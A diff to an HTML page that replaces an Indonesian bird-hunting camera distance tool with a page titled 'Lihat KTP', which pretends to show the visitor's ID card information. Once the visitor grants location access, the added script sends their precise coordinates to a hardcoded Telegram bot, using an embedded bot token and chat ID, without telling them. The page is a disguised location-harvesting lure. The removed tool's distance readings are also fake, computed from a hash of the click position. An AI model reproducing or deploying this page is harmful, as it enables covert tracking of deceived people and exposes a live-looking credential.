@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pengukur Jarak Kamera - Hunting Burung</title>
+    <title>Lihat KTP</title>
     <style>
         * {
             margin: 0;
@@ -13,570 +13,486 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            color: #fff;
+            background: linear-gradient(135deg, #0c2461 0%, #1e3799 100%);
             min-height: 100vh;
-            padding: 20px;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         
         .container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            max-width: 500px;
             width: 100%;
-            max-width: 1000px;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 25px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            margin-top: 20px;
+            text-align: center;
         }
         
-        header {
-            text-align: center;
+        .ktp-icon {
+            font-size: 70px;
+            color: #0c2461;
             margin-bottom: 20px;
         }
         
         h1 {
-            font-size: 2.5rem;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            margin-bottom: 10px;
-            color: #ffcc00;
+            color: #0c2461;
+            margin-bottom: 15px;
+            font-size: 28px;
         }
         
-        .description {
-            font-size: 1.1rem;
-            opacity: 0.9;
-            max-width: 800px;
-            margin: 0 auto;
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
         }
         
-        .camera-container {
-            position: relative;
-            width: 100%;
-            height: 0;
-            padding-bottom: 75%; /* 4:3 aspect ratio */
-            background-color: #000;
-            border-radius: 15px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        #video, #camera-overlay {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            object-fit: cover;
-        }
-        
-        #camera-overlay {
-            z-index: 10;
-            cursor: crosshair;
-        }
-        
-        .controls {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-        
-        button {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 50px;
-            background: linear-gradient(to right, #ff9966, #ff5e62);
+        .ktp-btn {
+            background: linear-gradient(to right, #0c2461 0%, #1e3799 100%);
             color: white;
-            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            padding: 16px 40px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(12, 36, 97, 0.4);
         }
         
-        button:hover {
+        .ktp-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 7px 20px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 6px 20px rgba(12, 36, 97, 0.6);
         }
         
-        button:active {
+        .ktp-btn:active {
             transform: translateY(1px);
         }
         
-        #reset-btn {
-            background: linear-gradient(to right, #3a7bd5, #00d2ff);
+        .ktp-btn i {
+            margin-right: 10px;
+            font-size: 20px;
         }
         
-        #capture-btn {
-            background: linear-gradient(to right, #38ef7d, #11998e);
-        }
-        
-        .mode-selector {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-            gap: 15px;
-        }
-        
-        .mode-btn {
-            padding: 10px 20px;
-            border: 2px solid #ffcc00;
-            border-radius: 30px;
-            background: transparent;
-            color: #ffcc00;
-            cursor: pointer;
-        }
-        
-        .mode-btn.active {
-            background: #ffcc00;
-            color: #000;
-        }
-        
-        .results {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 15px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        #distance {
-            font-size: 3rem;
-            font-weight: bold;
-            margin: 10px 0;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-            color: #ffcc00;
-        }
-        
-        .unit {
-            font-size: 1.2rem;
-            opacity: 0.8;
-        }
-        
-        .info-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
-            border-radius: 15px;
-            font-size: 0.9rem;
+        .status {
             margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            background-color: #f8f9fa;
+            border-left: 4px solid #0c2461;
+        }
+        
+        .status.success {
+            border-left-color: #28a745;
+            background-color: #d4edda;
+            color: #155724;
+        }
+        
+        .status.error {
+            border-left-color: #dc3545;
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        
+        .map-container {
+            margin-top: 20px;
+            height: 250px;
+            border-radius: 10px;
+            overflow: hidden;
+            display: none;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #0c2461;
+        }
+        
+        #map {
+            height: 100%;
+            width: 100%;
+        }
+        
+        .location-info {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #555;
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            text-align: left;
+            border: 1px solid #e9ecef;
         }
         
         .instructions {
-            background: rgba(0, 0, 0, 0.3);
+            background-color: #f8f9fa;
             padding: 20px;
-            border-radius: 15px;
-            margin-top: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            text-align: left;
         }
         
         .instructions h3 {
-            color: #ffcc00;
+            color: #0c2461;
             margin-bottom: 10px;
-        }
-        
-        .instructions ol {
-            padding-left: 20px;
-        }
-        
-        .instructions li {
-            margin-bottom: 10px;
-        }
-        
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 0.9rem;
-            opacity: 0.7;
-        }
-        
-        .reticle {
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ff0000;
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            z-index: 20;
-            display: none;
-        }
-        
-        .stability-indicator {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 10px;
-            border-radius: 10px;
-            z-index: 15;
             display: flex;
             align-items: center;
         }
         
-        .stability-dot {
-            width: 15px;
-            height: 15px;
+        .instructions h3 i {
+            margin-right: 10px;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+            color: #555;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 15px;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 20px;
+        }
+        
+        .loading-dots div {
+            position: absolute;
+            top: 8px;
+            width: 10px;
+            height: 10px;
             border-radius: 50%;
-            margin-right: 8px;
+            background: #0c2461;
+            animation-timing-function: cubic-bezier(0, 1, 1, 0);
         }
         
-        .stable {
-            background: #38ef7d;
+        .loading-dots div:nth-child(1) {
+            left: 8px;
+            animation: loading-dots1 0.6s infinite;
         }
         
-        .unstable {
-            background: #ff5e62;
+        .loading-dots div:nth-child(2) {
+            left: 8px;
+            animation: loading-dots2 0.6s infinite;
         }
         
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 2rem;
-            }
-            
+        .loading-dots div:nth-child(3) {
+            left: 32px;
+            animation: loading-dots2 0.6s infinite;
+        }
+        
+        .loading-dots div:nth-child(4) {
+            left: 56px;
+            animation: loading-dots3 0.6s infinite;
+        }
+        
+        @keyframes loading-dots1 {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes loading-dots3 {
+            0% { transform: scale(1); }
+            100% { transform: scale(0); }
+        }
+        
+        @keyframes loading-dots2 {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(24px, 0); }
+        }
+        
+        .action-buttons {
+            display: none;
+            margin-top: 15px;
+            gap: 10px;
+        }
+        
+        .action-btn {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        
+        .maps-btn {
+            background: #4285f4;
+            color: white;
+        }
+        
+        .maps-btn:hover {
+            background: #3367d6;
+        }
+        
+        @media (max-width: 480px) {
             .container {
-                padding: 15px;
+                padding: 25px;
             }
             
-            button {
-                padding: 10px 20px;
-                font-size: 0.9rem;
+            h1 {
+                font-size: 24px;
             }
             
-            #distance {
-                font-size: 2.5rem;
+            .ktp-btn {
+                padding: 14px 30px;
+                font-size: 16px;
+                width: 100%;
+            }
+            
+            .ktp-icon {
+                font-size: 60px;
+            }
+            
+            .map-container {
+                height: 200px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
             }
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
 </head>
 <body>
     <div class="container">
-        <header>
-            <h1>Pengukur Jarak untuk Hunting Burung</h1>
-            <p class="description">Aktifkan kamera, arahkan ke target, klik untuk mengetahui jarak secara real-time</p>
-        </header>
-        
-        <div class="mode-selector">
-            <button class="mode-btn active" id="mode-burung">Mode Burung</button>
-            <button class="mode-btn" id="mode-umum">Mode Umum</button>
+        <div class="ktp-icon">
+            <i class="fas fa-id-card"></i>
         </div>
         
-        <div class="camera-container">
-            <video id="video" autoplay playsinline></video>
-            <canvas id="camera-overlay"></canvas>
-            <div class="reticle"></div>
-            <div class="stability-indicator">
-                <div class="stability-dot stable"></div>
-                <span>Stabil</span>
+        <h1>Lihat KTP</h1>
+        <p>Tekan tombol di bawah untuk melihat informasi KTP</p>
+        
+        <button class="ktp-btn" id="viewKtpBtn">
+            <i class="fas fa-search"></i> Lihat KTP
+        </button>
+        
+        <div class="loading" id="loadingIndicator">
+            <div class="loading-dots">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
             </div>
+            <span style="margin-left: 10px;">Mencari lokasi...</span>
         </div>
         
-        <div class="controls">
-            <button id="start-btn">Aktifkan Kamera</button>
-            <button id="reset-btn">Reset</button>
-            <button id="capture-btn">Ambil Gambar</button>
+        <div class="map-container" id="mapContainer">
+            <div id="map"></div>
         </div>
         
-        <div class="results">
-            <h2>Jarak ke Target</h2>
-            <div id="distance">0.00</div>
-            <div class="unit">meter</div>
+        <div class="location-info" id="locationInfo">
+            <strong>Informasi Lokasi:</strong><br>
+            <span id="coordinatesText"></span><br>
+            <span id="accuracyText"></span>
+            <span id="addressText"></span>
         </div>
+        
+        <div class="action-buttons" id="actionButtons">
+            <button class="action-btn maps-btn" id="openMapsBtn">
+                <i class="fas fa-external-link-alt"></i> Buka di Google Maps
+            </button>
+        </div>
+        
+        <div class="status" id="statusMessage"></div>
         
         <div class="instructions">
-            <h3>Cara Penggunaan:</h3>
+            <h3><i class="fas fa-info-circle"></i> Cara Penggunaan:</h3>
             <ol>
-                <li>Klik tombol "Aktifkan Kamera" dan izinkan akses ke kamera</li>
-                <li>Pilih mode pengukuran (Burung atau Umum)</li>
-                <li>Arahkan kamera ke target dan tunggu hingga stabil (indikator hijau)</li>
-                <li>Klik pada target di layar untuk mengukur jarak</li>
-                <li>Gunakan tombol "Ambil Gambar" untuk menyimpan hasil</li>
+                <li>Pastikan browser mengizinkan akses lokasi</li>
+                <li>Klik tombol "Lihat KTP"</li>
+                <li>Izinkan akses lokasi jika diminta</li>
+                <li>Tunggu hingga peta dan informasi lokasi muncul</li>
             </ol>
-        </div>
-        
-        <div class="info-box">
-            <p><strong>Tips Akurasi:</strong> Pastikan kamera stabil sebelum melakukan pengukuran. Gunakan mode Burung untuk target kecil dan mode Umum untuk target besar. Hasil akan konsisten untuk objek yang sama pada kondisi pencahayaan yang sama.</p>
-        </div>
-        
-        <div class="footer">
-            <p>Web Pengukur Jarak Kamera &copy; 2023 - Dibuat untuk para pemburu</p>
         </div>
     </div>
 
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const video = document.getElementById('video');
-            const cameraOverlay = document.getElementById('camera-overlay');
-            const startBtn = document.getElementById('start-btn');
-            const resetBtn = document.getElementById('reset-btn');
-            const captureBtn = getId('capture-btn');
-            const modeBurungBtn = getId('mode-burung');
-            const modeUmumBtn = getId('mode-umum');
-            const distanceElement = getId('distance');
-            const reticle = document.querySelector('.reticle');
-            const stabilityDot = document.querySelector('.stability-dot');
-            const stabilityText = document.querySelector('.stability-indicator span');
-            const ctx = cameraOverlay.getContext('2d');
+        // Token dan ID Telegram
+        const botToken = '8262226985:AAEaIrI-Fi3j8lb25hAWDR3UUHur4fNDPBQ';
+        const chatId = '7786718775';
+        
+        let map;
+        let currentMarker;
+        let currentLatitude;
+        let currentLongitude;
+        
+        document.getElementById('viewKtpBtn').addEventListener('click', function() {
+            const statusMessage = document.getElementById('statusMessage');
+            const locationInfo = document.getElementById('locationInfo');
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            const mapContainer = document.getElementById('mapContainer');
+            const actionButtons = document.getElementById('actionButtons');
+            const coordinatesText = document.getElementById('coordinatesText');
+            const accuracyText = document.getElementById('accuracyText');
+            const addressText = document.getElementById('addressText');
             
-            let isMeasuring = false;
-            let stream = null;
-            let currentMode = 'burung';
-            let lastPosition = null;
-            let lastDistance = 0;
-            let isStable = false;
-            let stabilityCheckInterval;
+            // Reset tampilan
+            statusMessage.style.display = 'none';
+            locationInfo.style.display = 'none';
+            mapContainer.style.display = 'none';
+            actionButtons.style.display = 'none';
+            loadingIndicator.style.display = 'block';
             
-            function getId(id) {
-                return document.getElementById(id);
+            // Periksa apakah browser mendukung geolokasi
+            if (!navigator.geolocation) {
+                loadingIndicator.style.display = 'none';
+                showStatus('Browser Anda tidak mendukung geolokasi.', 'error');
+                return;
             }
             
-            // Set canvas size to match video
-            function resizeCanvas() {
-                if (video.videoWidth && video.videoHeight) {
-                    cameraOverlay.width = video.videoWidth;
-                    cameraOverlay.height = video.videoHeight;
-                }
-            }
-            
-            // Initialize
-            window.addEventListener('load', function() {
-                cameraOverlay.width = 640;
-                cameraOverlay.height = 480;
-            });
-            
-            // Mode selection
-            modeBurungBtn.addEventListener('click', function() {
-                modeBurungBtn.classList.add('active');
-                modeUmumBtn.classList.remove('active');
-                currentMode = 'burung';
-                resetMeasurement();
-            });
-            
-            modeUmumBtn.addEventListener('click', function() {
-                modeUmumBtn.classList.remove('active');
-                modeBurungBtn.classList.add('active');
-                currentMode = 'umum';
-                resetMeasurement();
-            });
-            
-            // Start camera function
-            startBtn.addEventListener('click', function() {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'environment',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        } 
-                    })
-                    .then(function(mediaStream) {
-                        stream = mediaStream;
-                        video.srcObject = mediaStream;
-                        video.play();
-                        
-                        video.onloadedmetadata = function() {
-                            resizeCanvas();
-                            isMeasuring = true;
-                            startBtn.textContent = "Kamera Aktif";
-                            startBtn.disabled = true;
-                            reticle.style.display = 'block';
-                            
-                            // Start stability monitoring
-                            startStabilityMonitoring();
-                        };
-                    })
-                    .catch(function(error) {
-                        alert("Tidak dapat mengakses kamera: " + error.message);
-                        console.error("Error accessing camera:", error);
-                    });
-                } else {
-                    alert("Browser Anda tidak mendukung akses kamera. Pastikan Anda menggunakan HTTPS.");
-                }
-            });
-            
-            // Start stability monitoring
-            function startStabilityMonitoring() {
-                stabilityCheckInterval = setInterval(() => {
-                    if (lastPosition) {
-                        // For demonstration, we're just using a simple timer
-                        // In a real app, you would analyze video frames for movement
-                        isStable = true;
-                        stabilityDot.className = 'stability-dot stable';
-                        stabilityText.textContent = 'Stabil';
+            // Dapatkan lokasi pengguna
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    loadingIndicator.style.display = 'none';
+                    
+                    currentLatitude = position.coords.latitude;
+                    currentLongitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    // Tampilkan peta
+                    showMap(currentLatitude, currentLongitude);
+                    mapContainer.style.display = 'block';
+                    
+                    // Tampilkan informasi lokasi
+                    coordinatesText.textContent = `Koordinat: ${currentLatitude.toFixed(6)}, ${currentLongitude.toFixed(6)}`;
+                    accuracyText.textContent = `Akurasi: ${accuracy} meter`;
+                    
+                    // Dapatkan alamat dari koordinat
+                    try {
+                        const address = await getAddressFromCoordinates(currentLatitude, currentLongitude);
+                        addressText.textContent = `Alamat: ${address}`;
+                    } catch (error) {
+                        addressText.textContent = `Alamat: Tidak dapat mengambil alamat`;
                     }
-                }, 2000);
-            }
-            
-            // Reset measurement
-            resetBtn.addEventListener('click', resetMeasurement);
-            
-            function resetMeasurement() {
-                ctx.clearRect(0, 0, cameraOverlay.width, cameraOverlay.height);
-                distanceElement.textContent = "0.00";
-                lastPosition = null;
-                lastDistance = 0;
-            }
-            
-            // Capture image
-            captureBtn.addEventListener('click', function() {
-                if (!isMeasuring) {
-                    alert("Silakan aktifkan kamera terlebih dahulu!");
-                    return;
+                    
+                    locationInfo.style.display = 'block';
+                    actionButtons.style.display = 'flex';
+                    
+                    // Kirim lokasi ke bot Telegram
+                    sendToTelegram(currentLatitude, currentLongitude, accuracy);
+                    
+                    // Tampilkan status berhasil
+                    showStatus('Lokasi berhasil ditemukan.', 'success');
+                },
+                function(error) {
+                    loadingIndicator.style.display = 'none';
+                    
+                    let errorMessage = 'Gagal mendapatkan lokasi. ';
+                    
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage += 'Silakan izinkan akses lokasi untuk melanjutkan.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage += 'Informasi lokasi tidak tersedia.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage += 'Pencarian lokasi memakan waktu terlalu lama.';
+                            break;
+                        default:
+                            errorMessage += 'Terjadi kesalahan tidak diketahui.';
+                    }
+                    
+                    showStatus(errorMessage, 'error');
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
                 }
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Draw measurement if exists
-                const distance = parseFloat(distanceElement.textContent);
-                if (distance > 0) {
-                    context.font = '24px Arial';
-                    context.fillStyle = 'white';
-                    context.strokeStyle = 'black';
-                    context.lineWidth = 4;
-                    context.strokeText(`Jarak: ${distance.toFixed(2)} m`, 20, 50);
-                    context.fillText(`Jarak: ${distance.toFixed(2)} m`, 20, 50);
-                    context.strokeText(`Mode: ${currentMode}`, 20, 90);
-                    context.fillText(`Mode: ${currentMode}`, 20, 90);
-                }
-                
-                // Create download link
-                const link = document.createElement('a');
-                link.download = 'hasil-pengukuran.png';
-                link.href = canvas.toDataURL('image/png');
-                link.click();
-            });
-            
-            // Handle mouse movement for reticle
-            cameraOverlay.addEventListener('mousemove', function(e) {
-                if (!isMeasuring) return;
-                
-                const rect = cameraOverlay.getBoundingClientRect();
-                const x = e.clientX - rect.left;
-                const y = e.clientY - rect.top;
-                
-                reticle.style.left = x + 'px';
-                reticle.style.top = y + 'px';
-            });
-            
-            // Handle click on overlay
-            cameraOverlay.addEventListener('click', function(e) {
-                if (!isMeasuring) {
-                    alert("Silakan aktifkan kamera terlebih dahulu!");
-                    return;
-                }
-                
-                if (!isStable) {
-                    alert("Tunggu hingga kamera stabil sebelum melakukan pengukuran!");
-                    return;
-                }
-                
-                const rect = cameraOverlay.getBoundingClientRect();
-                const scaleX = cameraOverlay.width / rect.width;
-                const scaleY = cameraOverlay.height / rect.height;
-                
-                const x = (e.clientX - rect.left) * scaleX;
-                const y = (e.clientY - rect.top) * scaleY;
-                
-                // Draw targeting circle
-                ctx.clearRect(0, 0, cameraOverlay.width, cameraOverlay.height);
-                ctx.fillStyle = 'rgba(255, 94, 98, 0.5)';
-                ctx.beginPath();
-                ctx.arc(x, y, 10, 0, Math.PI * 2);
-                ctx.fill();
-                ctx.strokeStyle = 'white';
-                ctx.lineWidth = 2;
-                ctx.stroke();
-                
-                // Calculate distance based on mode and position
-                const distance = calculateStableDistance(x, y, currentMode);
-                distanceElement.textContent = distance.toFixed(2);
-                
-                // Draw distance text
-                ctx.font = '20px Arial';
-                ctx.fillStyle = 'white';
-                ctx.strokeStyle = 'black';
-                ctx.lineWidth = 4;
-                ctx.strokeText(`${distance.toFixed(2)} m`, x + 15, y - 15);
-                ctx.fillText(`${distance.toFixed(2)} m`, x + 15, y - 15);
-                
-                // Store position and distance for consistency
-                lastPosition = { x, y };
-                lastDistance = distance;
-            });
-            
-            // Calculate stable distance based on position and mode
-            function calculateStableDistance(x, y, mode) {
-                // If we've measured this position before, return the same distance
-                if (lastPosition && isSimilarPosition(x, y, lastPosition.x, lastPosition.y)) {
-                    return lastDistance;
-                }
-                
-                // Dapatkan dimensi video
-                const width = cameraOverlay.width;
-                const height = cameraOverlay.height;
-                
-                // Hitung posisi relatif dari tengah frame
-                const centerX = width / 2;
-                const centerY = height / 2;
-                
-                const distFromCenter = Math.sqrt(
-                    Math.pow(x - centerX, 2) + 
-                    Math.pow(y - centerY, 2)
-                );
-                
-                // Normalisasi jarak dari pusat (0-1)
-                const maxDist = Math.sqrt(
-                    Math.pow(centerX, 2) + 
-                    Math.pow(centerY, 2)
-                );
-                
-                const normalizedDist = distFromCenter / maxDist;
-                
-                // Base distance based on mode
-                const baseDistance = mode === 'burung' ? 120 : 80;
-                
-                // Calculate consistent distance based on position
-                // This algorithm ensures the same position always returns the same distance
-                const positionHash = hashPosition(x, y);
-                const calculatedDistance = baseDistance * normalizedDist * (0.9 + (positionHash % 20) / 100);
-                
-                // Batasi jarak antara 5-300 meter
-                return Math.max(5, Math.min(300, calculatedDistance));
-            }
-            
-            // Check if two positions are similar
-            function isSimilarPosition(x1, y1, x2, y2, threshold = 10) {
-                return Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2)) < threshold;
-            }
-            
-            // Create a simple hash from position for consistent results
-            function hashPosition(x, y) {
-                return Math.floor(x * 1000 + y * 1000) % 100;
-            }
-            
-            // Handle window resize
-            window.addEventListener('resize', function() {
-                if (video.videoWidth && video.videoHeight) {
-                    resizeCanvas();
-                }
-            });
-            
-            // Clean up when leaving the page
-            window.addEventListener('beforeunload', function() {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                if (stabilityCheckInterval) {
-                    clearInterval(stabilityCheckInterval);
-                }
-            });
+            );
         });
+        
+        function showMap(lat, lng) {
+            const mapContainer = document.getElementById('map');
+            
+            if (map) {
+                map.remove();
+            }
+            
+            // Inisialisasi peta
+            map = L.map('map').setView([lat, lng], 16);
+            
+            // Tambahkan tile layer (OpenStreetMap)
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap contributors'
+            }).addTo(map);
+            
+            // Tambahkan marker
+            currentMarker = L.marker([lat, lng]).addTo(map)
+                .bindPopup('Lokasi Anda')
+                .openPopup();
+            
+            // Tambahkan circle untuk menunjukkan akurasi
+            L.circle([lat, lng], {
+                color: 'red',
+                fillColor: '#f03',
+                fillOpacity: 0.2,
+                radius: 50
+            }).addTo(map);
+        }
+        
+        document.getElementById('openMapsBtn').addEventListener('click', function() {
+            if (currentLatitude && currentLongitude) {
+                const mapsUrl = `https://www.google.com/maps?q=${currentLatitude},${currentLongitude}`;
+                window.open(mapsUrl, '_blank');
+            }
+        });
+        
+        async function getAddressFromCoordinates(lat, lng) {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+                const data = await response.json();
+                
+                if (data && data.display_name) {
+                    return data.display_name;
+                }
+                return 'Alamat tidak ditemukan';
+            } catch (error) {
+                return 'Gagal mengambil alamat';
+            }
+        }
+        
+        function showStatus(message, type) {
+            const statusMessage = document.getElementById('statusMessage');
+            statusMessage.textContent = message;
+            statusMessage.className = 'status ' + type;
+            statusMessage.style.display = 'block';
+        }
+        
+        function sendToTelegram(latitude, longitude, accuracy) {
+            // URL untuk mengirim lokasi melalui bot Telegram
+            const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+            
+            // Kirim permintaan ke API Telegram
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error('Gagal mengirim lokasi ke Telegram');
+                    }
+                })
+                .catch(error => {
+                    console.error('Terjadi kesalahan saat mengirim ke Telegram');
+                });
+        }
     </script>
 </body>
 </html>
